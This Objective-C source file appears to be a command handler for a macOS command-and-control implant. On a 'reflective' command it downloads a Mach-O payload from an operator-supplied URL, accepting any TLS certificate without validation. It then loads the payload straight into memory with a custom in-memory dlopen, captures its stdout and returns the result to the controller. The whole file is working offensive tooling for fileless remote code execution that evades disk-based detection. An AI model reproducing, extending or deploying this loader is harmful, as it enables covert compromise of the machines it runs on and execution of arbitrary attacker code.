#import "ZReflectiveCommandHandler.h"
#import "custom_dlfcn.h"
#import "ZAPIClient.h"
#import <mach-o/loader.h>
#import <mach-o/dyld.h>
#import <dlfcn.h>
#import <mach-o/dyld_images.h>
#import <mach-o/nlist.h>
#import <mach/mach.h>
#import <mach/vm_map.h>

typedef void (*constructor_t)(void);

// Wrapper function to handle C++ exceptions
static void* safe_custom_dlopen_from_memory(void* data, int size, NSString** error) {
    try {
        return custom_dlopen_from_memory(data, size);
    } catch (const char* e) {
        if (error) {
            *error = [NSString stringWithUTF8String:e];
        }
        return NULL;
    } catch (...) {
        if (error) {
            *error = @"Unknown error during payload loading";
        }
        return NULL;
    }
}

@interface ZReflectiveCommandHandler () <NSURLSessionDelegate>
@property (nonatomic, retain) NSMutableArray *loadedPayloads;
@end

@implementation ZReflectiveCommandHandler

- (id)init {
    self = [super init];
    if (self) {
        self.loadedPayloads = [[NSMutableArray alloc] init];
    }
    return self;
}

- (void)dealloc {
    NSLog(@"[DEBUG] ZReflectiveCommandHandler dealloc called");
    [self.loadedPayloads release];
    [super dealloc];
}

- (NSString *)command {
    return @"reflective";
}

- (BOOL)hasChainedFixups:(const void *)machHeader {
    const struct mach_header_64 *header = (const struct mach_header_64 *)machHeader;
    struct load_command *cmd = (struct load_command *)((char *)header + sizeof(struct mach_header_64));
    
    for (uint32_t i = 0; i < header->ncmds; i++) {
        if (cmd->cmd == LC_DYLD_CHAINED_FIXUPS) {
            return YES;
        }
        cmd = (struct load_command *)((char *)cmd + cmd->cmdsize);
    }
    return NO;
}

- (NSString *)captureOutput:(void (^)(void))block {
    // Create a pipe
    int pipefd[2];
    pipe(pipefd);
    
    // Save original stdout
    int stdout_fd = dup(STDOUT_FILENO);
    
    // Redirect stdout to pipe
    dup2(pipefd[1], STDOUT_FILENO);
    close(pipefd[1]);
    
    // Execute the block
    block();
    fflush(stdout);
    
    // Restore original stdout
    dup2(stdout_fd, STDOUT_FILENO);
    close(stdout_fd);
    
    // Read from pipe
    NSMutableData *data = [NSMutableData data];
    char buffer[1024];
    ssize_t bytesRead;
    
    while ((bytesRead = read(pipefd[0], buffer, sizeof(buffer))) > 0) {
        [data appendBytes:buffer length:bytesRead];
    }
    
    close(pipefd[0]);
    
    // Convert to string
    return [[[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] autorelease];
}

- (constructor_t)findConstructor:(const void *)machHeader {
    const struct mach_header_64 *header = (const struct mach_header_64 *)machHeader;
    struct load_command *cmd = (struct load_command *)((char *)header + sizeof(struct mach_header_64));
    
    for (uint32_t i = 0; i < header->ncmds; i++) {
        if (cmd->cmd == LC_SEGMENT_64) {
            struct segment_command_64 *seg = (struct segment_command_64 *)cmd;
            if (strcmp(seg->segname, "__TEXT") == 0) {
                struct section_64 *sect = (struct section_64 *)((char *)seg + sizeof(struct segment_command_64));
                for (uint32_t j = 0; j < seg->nsects; j++) {
                    if (strcmp(sect->sectname, "__mod_init_func") == 0) {
                        constructor_t *ctors = (constructor_t *)((char *)machHeader + sect->offset);
                        return ctors[0];  // Return the first constructor
                    }
                    sect++;
                }
            }
        }
        cmd = (struct load_command *)((char *)cmd + cmd->cmdsize);
    }
    return NULL;
}

- (void)logMachOHeader:(const struct mach_header_64 *)header {
    NSLog(@"[DEBUG] Mach-O Header Analysis:");
    NSLog(@"[DEBUG]   - Magic: 0x%x", header->magic);
    NSLog(@"[DEBUG]   - CPU Type: 0x%x", header->cputype);
    NSLog(@"[DEBUG]   - CPU Subtype: 0x%x", header->cpusubtype);
    NSLog(@"[DEBUG]   - File Type: 0x%x", header->filetype);
    NSLog(@"[DEBUG]   - Number of Load Commands: %d", header->ncmds);
    NSLog(@"[DEBUG]   - Size of Load Commands: %d", header->sizeofcmds);
    NSLog(@"[DEBUG]   - Flags: 0x%x", header->flags);
    
    struct load_command *cmd = (struct load_command *)((char *)header + sizeof(struct mach_header_64));
    NSLog(@"[DEBUG] Load Commands:");
    for (uint32_t i = 0; i < header->ncmds; i++) {
        NSLog(@"[DEBUG]   - Command %d: Type=0x%x, Size=%d", i, cmd->cmd, cmd->cmdsize);
        cmd = (struct load_command *)((char *)cmd + cmd->cmdsize);
    }
}

- (void)logPayloadInfo:(NSData *)payloadData {
    const struct mach_header_64 *header = (const struct mach_header_64 *)payloadData.bytes;
    if (payloadData.length < sizeof(struct mach_header_64)) {
        NSLog(@"[DEBUG] ❌ Payload too small to contain Mach-O header (size: %lu)", (unsigned long)payloadData.length);
        return;
    }
    
    NSLog(@"[DEBUG] 📦 Payload Analysis:");
    NSLog(@"[DEBUG]   - Total Size: %lu bytes", (unsigned long)payloadData.length);
    NSLog(@"[DEBUG]   - Data Location: %p", payloadData.bytes);
    NSLog(@"[DEBUG]   - First 16 bytes: %@", 
          [payloadData subdataWithRange:NSMakeRange(0, MIN(16, payloadData.length))].description);
    
    if (header->magic == MH_MAGIC_64) {
        NSLog(@"[DEBUG] ✅ Valid Mach-O 64-bit magic number detected");
        [self logMachOHeader:header];
    } else {
        NSLog(@"[DEBUG] ❌ Invalid Mach-O magic number: 0x%x", header->magic);
    }
}

- (void)executeCommand:(ZCommandModel *)command 
            completion:(void (^)(BOOL success, NSDictionary *result, NSError *error))completion {
    NSLog(@"[DEBUG] 🚀 Starting reflective command execution");
    NSLog(@"[DEBUG]   - Command ID: %@", command.commandId);
    NSLog(@"[DEBUG]   - Command Type: %@", command.type);
    
    // Get the URL from params
    NSString *urlString = command.payload[@"url"];
    if (!urlString) {
        NSLog(@"[DEBUG] ❌ No URL provided in payload");
        NSError *error = [NSError errorWithDomain:@"ZReflectiveCommandHandler" 
                                           code:100 
                                       userInfo:@{NSLocalizedDescriptionKey: @"No URL provided"}];
        completion(NO, nil, error);
        return;
    }
    
    NSLog(@"[DEBUG] 📥 Downloading payload from URL: %@", urlString);
    
    // Create URL and request
    NSURL *url = [NSURL URLWithString:urlString];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"GET"];
    
    // Create semaphore for synchronous operation
    dispatch_semaphore_t semaphore = dispatch_semaphore_create(0);
    
    __block NSData *payloadData = nil;
    __block NSError *downloadError = nil;
    
    // Use NSURLSession with SSL handling
    NSURLSessionConfiguration *config = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:config
                                                        delegate:self
                                                   delegateQueue:nil];
    
    NSURLSessionDataTask *task = [session dataTaskWithRequest:request
                                          completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if ([response isKindOfClass:[NSHTTPURLResponse class]]) {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
            NSLog(@"[DEBUG] 📡 Download response status code: %ld", (long)httpResponse.statusCode);
            NSLog(@"[DEBUG]   - Response Headers: %@", httpResponse.allHeaderFields);
        }
        
        if (error) {
            NSLog(@"[DEBUG] ❌ Download error: %@", error);
            NSLog(@"[DEBUG]   - Error Domain: %@", error.domain);
            NSLog(@"[DEBUG]   - Error Code: %ld", (long)error.code);
            NSLog(@"[DEBUG]   - Error UserInfo: %@", error.userInfo);
        }
        
        payloadData = [data retain];
        downloadError = [error retain];
        dispatch_semaphore_signal(semaphore);
    }];
    [task resume];
    
    // Wait for completion
    dispatch_semaphore_wait(semaphore, DISPATCH_TIME_FOREVER);
    dispatch_release(semaphore);
    
    if (!payloadData || downloadError) {
        NSLog(@"[DEBUG] ❌ Download failed: %@", downloadError);
        NSError *error = [NSError errorWithDomain:@"ZReflectiveCommandHandler" 
                                           code:101 
                                       userInfo:@{NSLocalizedDescriptionKey: [NSString stringWithFormat:@"Failed to download payload: %@", downloadError.localizedDescription]}];
        [payloadData release];
        [downloadError release];
        completion(NO, nil, error);
        return;
    }
    
    NSLog(@"[DEBUG] ✅ Downloaded payload successfully");
    [self logPayloadInfo:payloadData];
    
    // Store the payload data to keep it alive
    NSLog(@"[DEBUG] 📝 Storing payload in memory");
    [self.loadedPayloads addObject:payloadData];
    NSLog(@"[DEBUG]   - Total loaded payloads: %lu", (unsigned long)self.loadedPayloads.count);
    
    __block void *handle = NULL;
    __block NSString *error_msg = nil;
    
    // Capture the output during execution
    NSLog(@"[DEBUG] 🔄 Setting up output capture");
    NSString *output = [self captureOutput:^{
        @try {
            NSLog(@"[DEBUG] 🔍 Attempting to load payload with custom_dlopen_from_memory");
            NSLog(@"[DEBUG]   - Payload address: %p", payloadData.bytes);
            NSLog(@"[DEBUG]   - Payload size: %d", (int)payloadData.length);
            
            handle = safe_custom_dlopen_from_memory((void *)payloadData.bytes, (int)payloadData.length, &error_msg);
            
            if (!handle) {
                if (!error_msg) {
                    const char *dlError = custom_dlerror();
                    error_msg = dlError ? [NSString stringWithUTF8String:dlError] : @"Unknown error";
                }
                NSLog(@"[DEBUG] ❌ custom_dlopen_from_memory failed");
                NSLog(@"[DEBUG]   - Error: %@", error_msg);
            } else {
                NSLog(@"[DEBUG] ✅ Successfully loaded payload");
                NSLog(@"[DEBUG]   - Handle: %p", handle);
            }
        } @catch (NSException *exception) {
            error_msg = [NSString stringWithFormat:@"%@: %@", exception.name, exception.reason];
            NSLog(@"[DEBUG] ❌ Exception during payload loading");
            NSLog(@"[DEBUG]   - Name: %@", exception.name);
            NSLog(@"[DEBUG]   - Reason: %@", exception.reason);
            NSLog(@"[DEBUG]   - UserInfo: %@", exception.userInfo);
            NSLog(@"[DEBUG]   - Callstack: %@", exception.callStackSymbols);
        }
    }];
    
    NSLog(@"[DEBUG] 📤 Captured Output: %@", output);
    
    if (!handle || error_msg) {
        NSLog(@"[DEBUG] ❌ Loading failed, preparing error response");
        NSError *error = [NSError errorWithDomain:@"ZReflectiveCommandHandler" 
                                           code:102 
                                       userInfo:@{NSLocalizedDescriptionKey: error_msg ?: @"Failed to load payload"}];
        completion(NO, nil, error);
    } else {
        NSLog(@"[DEBUG] ✅ Loading succeeded, preparing success response");
        completion(YES, @{
            @"status": @"success",
            @"message": @"Payload loaded successfully",
            @"bytes_loaded": @(payloadData.length),
            @"output": output ?: @"",
            @"handle": [NSString stringWithFormat:@"%p", handle]
        }, nil);
    }
    
    NSLog(@"[DEBUG] 🏁 Command execution completed");
    [payloadData release];
}

- (BOOL)canCancelCommand {
    return NO;
}

- (BOOL)cancelCommand:(ZCommandModel *)command {
    return NO;
}

#pragma mark - NSURLSessionDelegate

- (void)URLSession:(NSURLSession *)session
didReceiveChallenge:(NSURLAuthenticationChallenge *)challenge
 completionHandler:(void (^)(NSURLSessionAuthChallengeDisposition disposition, NSURLCredential *credential))completionHandler {
    NSLog(@"[DEBUG] Received SSL challenge for host: %@", challenge.protectionSpace.host);
    
    if ([challenge.protectionSpace.authenticationMethod isEqualToString:NSURLAuthenticationMethodServerTrust]) {
        NSLog(@"[DEBUG] Accepting SSL certificate for host: %@", challenge.protectionSpace.host);
        NSURLCredential *credential = [NSURLCredential credentialForTrust:challenge.protectionSpace.serverTrust];
        completionHandler(NSURLSessionAuthChallengeUseCredential, credential);
    } else {
        NSLog(@"[DEBUG] Using default handling for auth challenge");
        completionHandler(NSURLSessionAuthChallengePerformDefaultHandling, nil);
    }
}

@end 